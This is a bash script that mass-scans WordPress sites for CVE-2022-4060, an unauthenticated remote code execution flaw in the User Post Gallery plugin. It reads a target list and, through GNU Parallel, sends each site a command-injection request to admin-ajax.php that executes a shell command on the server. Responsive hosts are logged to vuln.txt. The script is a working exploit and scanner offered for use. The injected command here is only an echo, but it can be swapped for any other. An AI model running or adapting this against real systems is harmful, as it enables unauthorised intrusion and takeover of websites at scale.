#!/bin/bash
# CVE-2022-4060 - User Post Gallery <= 2.19 - Unauthenticated RCE
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash upger.sh list.txt thread

yellow='\033[1;33m'
classic='\033[0m'
cyan='\033[1;36m' 

banner=$(cat << "EOF"
 ____ ____ ____ ____ ____
||U |||P |||G |||e |||r ||
||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|
                          
EOF
)

printf "${cyan}$banner${classic}\n"
printf "${yellow}CVE-2022-4060 Mass Vulnerability Checker${classic}\n\n"
printf "Created By ${yellow}Im-Hanzou${classic}\n"
printf "Github: ${yellow}im-hanzou${classic}\n\n"

touch vuln.txt notvuln.txt
exploit(){	
red='\033[1;31m'
green='\033[1;32m'
classic='\033[0m'
target=$1
thread=$2

if [[ ! $target =~ ^https?:// ]]; then
    target="https://$target"
fi

if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-content/plugins/wp-upg/readme.txt") =~ 'Gallery - UPG' ]]; 
then
    if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20Tout%20va%20bien:NULL:NULL") =~ 'Tout va bien' ]];
    then
        printf "${green}[ Vuln ]${classic} => [$target]\n";
        echo "$target" >> vuln.txt
    else
        printf "${red}[ Not Vuln ]${classic} => $target\n";
        echo "$target" >> notvuln.txt
    fi
else
    printf "${red}[ Not UPG! ]${classic} => $target\n";
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "${yellow}Total Vuln : $total\n"
printf "Total Not Vuln : $totalb${classic}\n"
